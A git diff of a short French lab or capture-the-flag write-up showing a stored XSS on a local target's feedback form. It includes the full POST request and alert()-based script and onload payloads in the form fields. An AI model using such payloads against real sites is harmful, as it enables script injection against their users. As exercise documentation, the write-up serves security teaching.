@@ -7,8 +7,10 @@ Sur la page `?page=feedback:` on peut voir un formulaire pour laisser un feedbac
 Requete:
 http://192.168.122.55/?page=feedback
 xss stored
+
 request:
 
+```
 POST /?page=feedback HTTP/1.1
 Host: 192.168.122.55
 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0
@@ -22,8 +24,11 @@ Connection: close
 Referer: http://192.168.122.55/?page=feedback
 Cookie: I_am_admin=68934a3e9455fa72420237eb05902327
 Upgrade-Insecure-Requests: 1
+```
 
+```
 txtName=<body onload=alert(0)>&mtxtMessage=%3Cscript%3Ealert%280%29%3C%2Fscript%3E&btnSign=Sign+Guestbook
+```
 
 En veritee pour l'exercice le flag s'obtiens seulement en marquant le terme "script" dans le champ message.
 Pour obtenir une reelle XSS on utiliseras un onload dans le champ Name.
